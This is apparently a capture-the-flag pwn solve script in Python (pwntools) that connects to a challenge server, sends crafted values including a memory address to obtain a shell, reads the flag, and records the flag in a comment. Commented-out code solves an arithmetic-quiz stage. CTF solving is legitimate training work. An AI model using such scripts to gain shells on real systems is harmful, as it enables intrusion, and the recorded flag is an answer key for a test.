# 張元_Pwn-7
from pwn import *

r = remote('140.110.112.218', 2117)
r.sendlineafter("1", "1052929") # test eax 0x1,0x100000,0x200
r.sendlineafter("2", "100 256 -87117812") # 0x64, 0x100, 0xfaceb00c
r.sendlineafter("3", str(0x60107C)) # 0x60107c
r.sendlineafter("Congrat! Here is your shell!", "cat flag") # BreakAllCTF{A_g00d_h4cker_15_f4m1liar_w1th_b1n4ry_5ystem}

# r.recvuntil('\n')

# magic = 0x79487ff
# r.sendline(p32(magic))

# r.recvuntil('\n')

# for i in range(1000):
#     equation = r.recvuntil('?')
#     equation = equation.decode('utf-8')
#     print(equation)
#     i1 = int(equation.split(' ')[0])
#     op = equation.split(' ')[1]
#     i2 = int(equation.split(' ')[2])

#     if op == '+':
#         r.sendline(str(i1 + i2))
#     elif op == '-':
#         r.sendline(str(i1 - i2))
#     elif op == '*':
#         r.sendline(str(i1 * i2))
#     else:
#         print('Error')

# r.recvuntil('Welcome hacker!')
# r.sendline('ls')
# r.sendline('cat flag')

r.interactive()